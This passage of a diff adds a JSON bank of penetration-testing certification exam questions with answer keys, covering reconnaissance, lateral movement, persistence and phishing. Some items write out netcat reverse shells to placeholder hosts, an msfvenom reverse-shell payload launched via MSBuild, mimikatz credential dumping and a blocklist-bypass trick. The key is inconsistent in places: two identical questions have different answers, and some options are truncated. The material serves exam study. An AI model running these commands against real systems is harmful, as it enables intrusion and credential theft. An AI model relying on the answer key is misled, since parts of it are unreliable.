+      "D": "shodan host comptia.org"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 69,
+    "question": "A penetration tester is conducting an assessment of a web application's login page. The tester needs to determine whether there are any hidden form fields of interest. Which of the following is the most effective technique?",
+    "options": {
+      "A": "XSS",
+      "B": "On-path attack",
+      "C": "SQL injection",
+      "D": "HTML scraping"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 70,
+    "question": "A penetration tester creates a list of target domains that require further enumeration. The tester writes the following script to perform vulnerability scanning across the domains: line 1: #!/usr/bin/bash line 2: DOMAINS_LIST = \"/path/to/list.txt\" line 3: while read -r i; do line 4: nikto -h $i -o scan-$i.txt & line 5: done The script does not work as intended. Which of the following should the tester do to fix the script? A.",
+    "options": {
+      "A": "Change line 2 to {\"domain1\", \"domain2\", \"domain3\", }.",
+      "B": "Change line 3 to while true; read -r i; do.",
+      "C": "Change line 4 to nikto $i | tee scan-$i.txt.",
+      "D": "Change line 5 to done < \"$DOMAINS_LIST\"."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 71,
+    "question": "A penetration tester needs to confirm the version number of a client's web application server. Which of the following techniques should the penetration tester use?",
+    "options": {
+      "A": "SSL certificate inspection",
+      "B": "URL spidering",
+      "C": "Banner grabbing",
+      "D": "Directory brute forcing"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 72,
+    "question": "A penetration tester needs to identify all vulnerable input fields on a customer website. Which of the following tools would be best suited to complete this request?",
+    "options": {
+      "A": "DAST",
+      "B": "SAST",
+      "C": "IAST",
+      "D": "SCA"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 73,
+    "question": "During an engagement, a penetration tester wants to enumerate users from Linux systems by using finger and rwho commands. However, the tester realizes these commands alone will not achieve the desired result. Which of the following is the best tool to use for this task?",
+    "options": {
+      "A": "Nikto",
+      "B": "Burp Suite",
+      "C": "smbclient",
+      "D": "theHarvester"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 74,
+    "question": "While performing a penetration test, a tester executes the following command: PS c:\\tools> c:\\hacks\\PsExec.exe \\\\server01.cor.ptia.org -accepteula cmd.exe Which of the following best explains what the tester is trying to do?",
+    "options": {
+      "A": "Test connectivity using PsExec on the server01 using cmd.exe",
+      "B": "Perform a lateral movement attack using PsExec",
+      "C": "Send the PsExec binary file to the server01 using cmd.exe",
+      "D": "Enable cmd.exe on the server01 through PsExec"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 75,
+    "question": "Which of the following frameworks can be used to classify threats?",
+    "options": {
+      "A": "PTES",
+      "B": "STRIDE",
+      "C": "OSSTMM",
+      "D": "OCTAVE"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 76,
+    "question": "While conducting an assessment, a penetration tester identifies details for several unreleased products announced at a company-wide meeting. Which of the following attacks did the tester most likely use to discover this information?",
+    "options": {
+      "A": "Eavesdropping",
+      "B": "Bluesnarfing",
+      "C": "Credential harvesting",
+      "D": "SQL injection attack"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 77,
+    "question": "A penetration tester is configuring a vulnerability management solution to perform credentialed scans of an Active Directory server. Which of the following account types should the tester provide to the scanner?",
+    "options": {
+      "A": "Read-only",
+      "B": "Domain administrator",
+      "C": "Local user",
+      "D": "Root"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 78,
+    "question": "During a pre-engagement activity with a new customer, a penetration tester looks for assets to test. Which of the following is an example of a target that can be used for testing?",
+    "options": {
+      "A": "API",
+      "B": "HTTP",
+      "C": "IPA",
+      "D": "ICMP"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 79,
+    "question": "As part of an engagement, a penetration tester wants to maintain access to a compromised system after rebooting. Which of the following techniques would be best for the tester to use?",
+    "options": {
+      "A": "Establishing a reverse shell",
+      "B": "Executing a process injection attack",
+      "C": "Creating a scheduled task",
+      "D": "Performing a credential-dumping attack"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 80,
+    "question": "A penetration tester identifies an exposed corporate directory containing first and last names and phone numbers for employees. Which of the following attack techniques would be the most effective to pursue if the penetration tester wants to compromise user accounts?",
+    "options": {
+      "A": "Smishing",
+      "B": "Impersonation",
+      "C": "Tailgating",
+      "D": "Whaling"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 81,
+    "question": "During a security assessment, a penetration tester captures plaintext login credentials on the communication between a user and an authentication system. The tester wants to use this information for further unauthorized access. Which of the following tools is the tester using?",
+    "options": {
+      "A": "Burp Suite",
+      "B": "Wireshark",
+      "C": "Zed Attack Proxy (ZAP)",
+      "D": "Metasploit"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 82,
+    "question": "A tester is performing an external phishing assessment on the top executives at a company. Two-factor authentication is enabled on the executives’ accounts that are in the scope of work. Which of the following should the tester do to get access to these accounts?",
+    "options": {
+      "A": "Configure an external domain using a typosquatting technique. Configure Evilginx to bypass two-factor",
+      "B": "Configure Gophish to use an external domain. Clone the email portal web page from the company and",
+      "C": "Configure an external domain using a typosquatting technique. Configure SET to bypass two-factor",
+      "D": "Configure Gophish to use an external domain. Clone the email portal web page from the company and"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 83,
+    "question": "During a penetration test, the tester gains full access to the application's source code. The application repository includes thousands of code files. Given that the assessment timeline is very short, which of the following approaches would allow the tester to identify hard-coded credentials most effectively?",
+    "options": {
+      "A": "Run TruffleHog against a local clone of the application",
+      "B": "Scan the live web application using Nikto",
+      "C": "Perform a manual code review of the Git repository",
+      "D": "Use SCA software to scan the application source code"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 84,
+    "question": "During a penetration test, a junior tester uses Hunter.io for an assessment and plans to review the information that will be collected. Which of the following describes the information the junior tester will receive from the Hunter.io tool?",
+    "options": {
+      "A": "A collection of email addresses for the target domain that is available on multiple sources on the internet",
+      "B": "DNS records for the target domain and subdomains that could be used to increase the external attack",
+      "C": "Data breach information about the organization that could be used for additional enumeration",
+      "D": "Information from the target's main web page that collects usernames, metadata, and possible data"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 85,
+    "question": "The following file was obtained during reconnaissance: Which of the following is most likely to be successful if a penetration tester achieves non-privileged user access?",
+    "options": {
+      "A": "Exposure of other users' sensitive data",
+      "B": "Unauthorized access to execute binaries via sudo",
+      "C": "Hijacking the default user login shells",
+      "D": "Corrupting the skeleton configuration file"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 86,
+    "question": "During the reconnaissance phase, a penetration tester collected the following information from the DNS records: A-----> www A-----> host TXT --> vpn.comptia.org SPF---> ip =2.2.2.2 Which of the following DNS records should be in place to avoid phishing attacks using spoofing domain techniques?",
+    "options": {
+      "A": "MX",
+      "B": "SOA",
+      "C": "DMARC",
+      "D": "CNAME"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 87,
+    "question": "A penetration tester finds an unauthenticated RCE vulnerability on a web server and wants to use it to enumerate other servers on the local network. The web server is behind a firewall that allows only an incoming connection to TCP ports 443 and 53 and unrestricted outbound TCP connections. The target web server is https://target.comptia.org. Which of the following should the tester use to perform the task with the fewest web requests?",
+    "options": {
+      "A": "nc -e /bin/sh -lp 53",
+      "B": "/bin/sh -c 'nc -l -p 443'",
+      "C": "nc -e /bin/sh <pentester_ip> 53",
+      "D": "/bin/sh -c 'nc <pentester_ip> 443'"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 88,
+    "question": "While conducting a peer review for a recent assessment, a penetration tester finds the debugging mode is still enabled for the production system. Which of the following is most likely responsible for this observation?",
+    "options": {
+      "A": "Configuration changes were not reverted.",
+      "B": "A full backup restoration is required for the server.",
+      "C": "The penetration test was not completed on time.",
+      "D": "The penetration tester was locked out of the system."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 89,
+    "question": "Which of the following techniques is the best way to avoid detection by Data Loss Prevention (DLP) tools?",
+    "options": {
+      "A": "Encoding",
+      "B": "Compression",
+      "C": "Encryption",
+      "D": "Obfuscation"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 90,
+    "question": "A penetration tester successfully clones a source code repository and then runs the following command: find . -type f -exec egrep -i \"token|key|login\" {} \\; Which of the following is the penetration tester conducting?",
+    "options": {
+      "A": "Data tokenization",
+      "B": "Secrets scanning",
+      "C": "Password spraying",
+      "D": "Source code analysis"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 92,
+    "question": "A penetration tester needs to collect information over the network for further steps in an internal assessment. Which of the following would most likely accomplish this goal?",
+    "options": {
+      "A": "ntlmrelayx.py -t 192.168.1.0/24 -1 1234",
+      "B": "nc -tulpn 1234 192.168.1.2",
+      "C": "responder.py -I eth0 -wP",
+      "D": "crackmapexec smb 192.168.1.0/24"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 93,
+    "question": "During an assessment, a penetration tester obtains access to an internal server and would like to perform further reconnaissance by capturing LLMNR traffic. Which of the following tools should the tester use?",
+    "options": {
+      "A": "Burp Suite",
+      "B": "Netcat",
+      "C": "Responder",
+      "D": "Nmap"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 94,
+    "question": "A penetration tester would like to leverage a CSRF vulnerability to gather sensitive details from an application's end users. Which of the following tools should the tester use for this task?",
+    "options": {
+      "A": "Browser Exploitation Framework",
+      "B": "Maltego",
+      "C": "Metasploit",
+      "D": "theHarvester"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 95,
+    "question": "Which of the following is the most efficient way to infiltrate a file containing data that could be sensitive?",
+    "options": {
+      "A": "Use steganography and send the file over FTP",
+      "B": "Compress the file and send it using TFTP",
+      "C": "Split the file in tiny pieces and send it over dnscat",
+      "D": "Encrypt and send the file over HTTPS"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 96,
+    "question": "A penetration tester discovers evidence of an advanced persistent threat on the network that is being tested. Which of the following should the tester do next?",
+    "options": {
+      "A": "Report the finding.",
+      "B": "Analyze the finding.",
+      "C": "Remove the threat.",
+      "D": "Document the finding and continue testing."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 97,
+    "question": "During an assessment, a penetration tester obtains a low-privilege shell and then runs the following command: findstr /SIM /C:\"pass\" *.txt *.cfg *.xml Which of the following is the penetration tester trying to enumerate?",
+    "options": {
+      "A": "Configuration files",
+      "B": "Permissions",
+      "C": "Virtual hosts",
+      "D": "Secrets"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 98,
+    "question": "During a security assessment of an e-commerce website, a penetration tester wants to exploit a vulnerability in the web server’s input validation that will allow unauthorized transactions on behalf of the user. Which of the following techniques would most likely be used for that purpose?",
+    "options": {
+      "A": "Privilege escalation",
+      "B": "DOM injection",
+      "C": "Session hijacking",
+      "D": "Cross-site scripting"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 99,
+    "question": "A tester runs an Nmap scan against a Windows server and receives the following results: Nmap scan report for win_dns.local (10.0.0.5) Host is up (0.014s latency) Port State Service 53/tcp open domain 161/tcp open snmp 445/tcp open smb-ds 3389/tcp open rdp Which of the following TCP ports should be prioritized for using hash-based relays?",
+    "options": {
+      "A": "53",
+      "B": "161",
+      "C": "445",
+      "D": "3389"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 100,
+    "question": "A penetration tester wants to create a malicious QR code to assist with a physical security assessment. Which of the following tools has the built-in functionality most likely needed for this task?",
+    "options": {
+      "A": "BeEF",
+      "B": "John the Ripper",
+      "C": "ZAP",
+      "D": "Evilginx"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 101,
+    "question": "A penetration tester is getting ready to conduct a vulnerability scan to evaluate an environment that consists of a container orchestration cluster. Which of the following tools would be best to use for this purpose?",
+    "options": {
+      "A": "NSE",
+      "B": "Nessus",
+      "C": "CME",
+      "D": "Trivy"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 102,
+    "question": "In a cloud environment, a security team discovers that an attacker accessed confidential information that was used to configure virtual machines during their initialization. Through which of the following features could this information have been accessed?",
+    "options": {
+      "A": "IAM",
+      "B": "Block storage",
+      "C": "Virtual private cloud",
+      "D": "Metadata services"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 103,
+    "question": "A penetration tester obtains the following output during an Nmap scan: PORT STATE SERVICE 135/tcp open msrpc 445/tcp open microsoft-ds 1801/tcp open msmq 2103/tcp open msrpc 3389/tcp open ms-wbt-server Which of the following should be the next step for the tester?",
+    "options": {
+      "A": "Search for vulnerabilities on msrpc.",
+      "B": "Enumerate shares and search for vulnerabilities on the SMB service.",
+      "C": "Execute a brute-force attack against the Remote Desktop Services.",
+      "D": "Execute a new Nmap command to search for another port."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 104,
+    "question": "A penetration tester presents the following findings to stakeholders: Control | Number of findings | Risk | Notes Encryption | 1 | Low | Weak algorithm noted Patching | 8 | Medium | Unsupported systems System hardening | 2 | Low | Baseline drift observed Secure SDLC | 10 | High | Libraries have vulnerabilities Password policy | 0 | Low | No exceptions noted Based on the findings, which of the following recommendations should the tester make? (Select two).",
+    "options": {
+      "A": "Develop a secure encryption algorithm.",
+      "B": "Deploy an asset management system.",
+      "C": "Write an SDLC policy.",
+      "D": "Implement an SCA tool.",
+      "E": "Obtain the latest library version.",
+      "F": "Patch the libraries."
+    },
+    "correct": [
+      "D",
+      "E"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 105,
+    "question": "A penetration tester is attempting to discover vulnerabilities in a company's web application. Which of the following tools would most likely assist with testing the security of the web application?",
+    "options": {
+      "A": "OpenVAS",
+      "B": "Nessus",
+      "C": "sqlmap",
+      "D": "Nikto"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 106,
+    "question": "A penetration tester wants to check the security awareness of specific workers in the company with targeted attacks. Which of the following attacks should the penetration tester perform?",
+    "options": {
+      "A": "Phishing",
+      "B": "Tailgating",
+      "C": "Whaling",
+      "D": "Spear phishing"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 107,
+    "question": "A penetration tester identifies the following open ports during a network enumeration scan: PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 443/tcp open https 27017/tcp open mongodb 50123/tcp open ms-rpc Which of the following commands did the tester use to get this output?",
+    "options": {
+      "A": "nmap -Pn -A 10.10.10.10",
+      "B": "nmap -sV 10.10.10.10",
+      "C": "nmap -Pn -w 10.10.10.10",
+      "D": "nmap -sV -Pn -p- 10.10.10.10"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 108,
+    "question": "Which of the following is within the scope of proper handling and most crucial when working on a penetration testing report?",
+    "options": {
+      "A": "Keeping both video and audio of everything that is done",
+      "B": "Keeping the report to a maximum of 5 to 10 pages in length",
+      "C": "Basing the recommendation on the risk score in the report",
+      "D": "Making the report clear for all objectives with a precise executive summary"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 109,
+    "question": "A penetration tester has adversely affected a critical system during an engagement, which could have a material impact on the organization. Which of the following should the penetration tester do to address this issue?",
+    "options": {
+      "A": "Restore the configuration.",
+      "B": "Perform a BIA.",
+      "C": "Follow the escalation process.",
+      "D": "Select the target."
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 110,
+    "question": "A tester plans to perform an attack technique over a compromised host. The tester prepares a payload using the following command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.12.12.1 LPORT=10112 -f csharp The tester then takes the shellcode from the msfvenom command and creates a file called evil.xml. Which of the following commands would most likely be used by the tester to continue with the attack on the host?",
+    "options": {
+      "A": "regsvr32 /s /n /u C:\\evil.xml",
+      "B": "MSBuild.exe C:\\evil.xml",
+      "C": "mshta.exe C:\\evil.xml",
+      "D": "AppInstaller.exe C:\\evil.xml"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 111,
+    "question": "A penetration tester is working on a security assessment of a mobile application that was developed in-house for local use by a hospital. The hospital and its customers are very concerned about disclosure of information. Which of the following tasks should the penetration tester do first?",
+    "options": {
+      "A": "Set up Drozer in order to manipulate and scan the application.",
+      "B": "Run the application through the mobile application security framework.",
+      "C": "Connect Frida to analyze the application at runtime to look for data leaks.",
+      "D": "Load the application on client-owned devices for testing."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 112,
+    "question": "A penetration tester needs to evaluate the order in which the next systems will be selected for testing. Given the following output: Hostname | IP address | CVSS 2.0 | EPSS hrdatabase | 192.168.20.55 | 9.9 | 0.50 financesite | 192.168.15.99 | 8.0 | 0.01 legaldatabase | 192.168.10.2 | 8.2 | 0.60 fileserver | 192.168.125.7 | 7.6 | 0.90 Which of the following targets should the tester select next?",
+    "options": {
+      "A": "fileserver",
+      "B": "hrdatabase",
+      "C": "legaldatabase",
+      "D": "financesite"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 113,
+    "question": "While performing a penetration testing exercise, a tester executes the following command: bash Copy code PS c:\\tools> c:\\hacks\\PsExec.exe \\\\server01.comptia.org -accepteula cmd.exe Which of the following best explains what the tester is trying to do?",
+    "options": {
+      "A": "Test connectivity using PSExec on the server01 using CMD.exe.",
+      "B": "Perform a lateral movement attack using PsExec.",
+      "C": "Send the PsExec binary file to the server01 using CMD.exe.",
+      "D": "Enable CMD.exe on the server01 through PsExec."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 114,
+    "question": "During a penetration test, a tester compromises a Windows computer. The tester executes the following command and receives the following output: mimikatz # privilege::debug mimikatz # lsadump::cache ---Output--- lapsUser 27dh9128361tsg2€459210138754ij ---OutputEnd--- Which of the following best describes what the tester plans to do by executing the command?",
+    "options": {
+      "A": "The tester plans to perform the first step to execute a Golden Ticket attack to compromise the Active",
+      "B": "The tester plans to collect application passwords or hashes to compromise confidential information",
+      "C": "The tester plans to use the hash collected to perform lateral movement to other computers using a local",
+      "D": "The tester plans to collect the ticket information from the user to perform a Kerberoasting attack on the"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 115,
+    "question": "A penetration tester finishes an initial discovery scan for hosts on a /24 customer subnet. The customer states that the production network is composed of Windows servers but no container clusters. The following are the last several lines from the scan log: Line 1: 112 hosts found... trying ports Line 2: FOUND 22 with OpenSSH 1.2p2 open on 99 hosts Line 3: FOUND 161 with UNKNOWN banner open on 110 hosts Line 4: TCP RST received on ports 21, 3389, 80 Line 5: Scan complete. Which of the following is the most likely reason for the results?",
+    "options": {
+      "A": "Multiple honeypots were encountered",
+      "B": "The wrong subnet was scanned",
+      "C": "Windows is using WSL",
+      "D": "IPS is blocking the ports"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 116,
+    "question": "During an assessment, a penetration tester sends the following request: POST /services/v1/users/create HTTP/1.1 Host: target-application.com Content-Type: application/json Content-Length: [dynamic] Authorization: Bearer (FUZZ) Which of the following attacks is the penetration tester performing?",
+    "options": {
+      "A": "Directory traversal",
+      "B": "API abuse",
+      "C": "Server-side request forgery",
+      "D": "Privilege escalation"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 118,
+    "question": "A penetration tester wants to use PowerView in an AD environment. Which of the following is the most likely reason?",
+    "options": {
+      "A": "To collect local hashes",
+      "B": "To decrypt stored passwords",
+      "C": "To enumerate user groups",
+      "D": "To escalate privileges"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 120,
+    "question": "Before starting an assessment, a penetration tester needs to scan a Class B IPv4 network for open ports in a short amount of time. Which of the following is the best tool for this task?",
+    "options": {
+      "A": "Burp Suite",
+      "B": "masscan",
+      "C": "Nmap",
+      "D": "hping"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 121,
+    "question": "A penetration tester cannot complete a full vulnerability scan because the client's WAF is blocking communications. During which of the following activities should the penetration tester discuss this issue with the client?",
+    "options": {
+      "A": "Goal reprioritization",
+      "B": "Peer review",
+      "C": "Client acceptance",
+      "D": "Stakeholder alignment"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 122,
+    "question": "A penetration tester is unable to identify the Wi-Fi SSID on a client’s cell phone. Which of the following techniques would be most effective to troubleshoot this issue?",
+    "options": {
+      "A": "Sidecar scanning",
+      "B": "Channel scanning",
+      "C": "Stealth scanning",
+      "D": "Static analysis scanning"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 123,
+    "question": "A penetration tester runs a network scan but has some issues accurately enumerating the vulnerabilities due to the following error: OS identification failed Which of the following is most likely causing this error?",
+    "options": {
+      "A": "The scan did not reach the target because of a firewall block rule.",
+      "B": "The scanner database is out of date.",
+      "C": "The scan is reporting a false positive.",
+      "D": "The scan cannot gather one or more fingerprints from the target."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 124,
+    "question": "Which of the following post-exploitation activities allows a penetration tester to maintain persistent access in a compromised system?",
+    "options": {
+      "A": "Creating registry keys",
+      "B": "Installing a bind shell",
+      "C": "Executing a process injection",
+      "D": "Setting up a reverse SSH connection"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 125,
+    "question": "During a security assessment, a penetration tester uses a tool to capture plaintext log-in credentials on the communication between a user and an authentication system. The tester wants to use this information for further unauthorized access. Which of the following tools is the tester using?",
+    "options": {
+      "A": "Burp Suite",
+      "B": "Wireshark",
+      "C": "Zed Attack Proxy",
+      "D": "Metasploit"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 126,
+    "question": "A company wants to perform a BAS (Breach and Attack Simu-lation) to measure the efficiency of the corporate security controls. Which of the following would most likely help the tester with simple command examples?",
+    "options": {
+      "A": "Infection Monkey",
+      "B": "Exploit-DB",
+      "C": "Atomic Red Team",
+      "D": "Mimikatz"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 127,
+    "question": "A penetration tester wants to maintain access to a compromised system after a reboot. Which of the following techniques would be best for the tester to use?",
+    "options": {
+      "A": "Establishing a reverse shell",
+      "B": "Executing a process injection attack",
+      "C": "Creating a scheduled task",
+      "D": "Performing a credential-dumping attack"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 128,
+    "question": "A penetration testing team wants to conduct DNS lookups for a set of targets provided by the client. The team crafts a Bash script for this task. However, they find a minor error in one line of the script: 1 #!/bin/bash 2 for i in $(cat example.txt); do 3 curl $i 4 done Which of the following changes should the team make to line 3 of the script?",
+    "options": {
+      "A": "resolvconf $i",
+      "B": "rndc $i",
+      "C": "systemd-resolve $i",
+      "D": "host $i"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 129,
+    "question": "A penetration tester is trying to bypass a command injection blocklist to exploit a remote code execution vulnerability. The tester uses the following command: nc -e /bin/sh 10.10.10.16 4444 Which of the following would most likely bypass the filtered space character?",
+    "options": {
+      "A": "${IFS}",
+      "B": "%0a",
+      "C": "+ *",
+      "D": "%20"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 130,
+    "question": "A penetration tester attempts unauthorized entry to the company's server room as part of a security assessment. Which of the following is the best technique to manipulate the lock pins and open the door without the original key?",
+    "options": {
+      "A": "Plug spinner",
+      "B": "Bypassing",
+      "C": "Decoding",
+      "D": "Raking"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 131,
+    "question": "A penetration tester is getting ready to conduct a vulnerability scan as part of the testing process. The tester will evaluate an environment that consists of a container orchestration cluster. Which of the following tools should the tester use to evaluate the cluster?",
+    "options": {
+      "A": "Trivy",
+      "B": "Nessus",
+      "C": "Grype",
+      "D": "Kube-hunter"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 132,
+    "question": "A penetration tester gains access to a host but does not have access to any type of shell. Which of the following is the best way for the tester to further enumerate the host and the environment in which it resides?",
+    "options": {
+      "A": "ProxyChains",
+      "B": "Netcat",
+      "C": "PowerShell ISE",
+      "D": "Process IDs"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 133,
+    "question": "A penetration tester is conducting a wireless security assessment for a client with 2.4GHz and 5GHz access points. The tester places a wireless USB dongle in the laptop to start capturing WPA2 handshakes. Which of the following steps should the tester take next?",
+    "options": {
+      "A": "Enable monitoring mode using Aircrack-ng.",
+      "B": "Use Kismet to automatically place the wireless dongle in monitor mode and collect handshakes.",
+      "C": "Run KARMA to break the password.",
+      "D": "Research WiGLE.net for potential nearby client access points."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 134,
+    "question": "A tester is working on an engagement that has evasion and stealth requirements. Which of the following enumeration methods is the least likely to be detected by the IDS?",
+    "options": {
+      "A": "curl https://api.shodan.io/shodan/host/search?key=<API_KEY>&query=hostname:<target>",
+      "B": "proxychains nmap -sV -T2 <target>",
+      "C": "for i in <target>; do curl -k $i; done",
+      "D": "nmap -sV -T2 <target>"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 135,
+    "question": "With one day left to complete the testing phase of an engagement, a penetration tester obtains the following results from an Nmap scan: Not shown: 1670 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.3 (CentOS) 3306/tcp open mysql MySQL (unauthorized) 8888/tcp open http lighttpd 1.4.32 Which of the following tools should the tester use to quickly identify a potential attack path?",
+    "options": {
+      "A": "msfvenom",
+      "B": "SearchSploit",
+      "C": "sqlmap",
+      "D": "BeEF"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 136,
+    "question": "A penetration tester gains access to a domain server and wants to enumerate the systems within the domain. Which of the following tools would provide the best oversight of domains?",
+    "options": {
+      "A": "Netcat",
+      "B": "Wireshark",
+      "C": "Nmap",
+      "D": "Responder"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 137,
+    "question": "A penetration tester compromises a Windows OS endpoint that is joined to an Active Directory local environment. Which of the following tools should the tester use to manipulate authentication mechanisms to move laterally in the network?",
+    "options": {
+      "A": "Rubeus",
+      "B": "WinPEAS",
+      "C": "NTLMRelayX",
+      "D": "Impacket"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 138,
+    "question": "During an assessment, a penetration tester runs the following command: setspn.exe -Q / Which of the following attacks is the penetration tester preparing for?",
+    "options": {
+      "A": "LDAP injection",
+      "B": "Pass-the-hash",
+      "C": "Kerberoasting",
+      "D": "Dictionary"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 139,
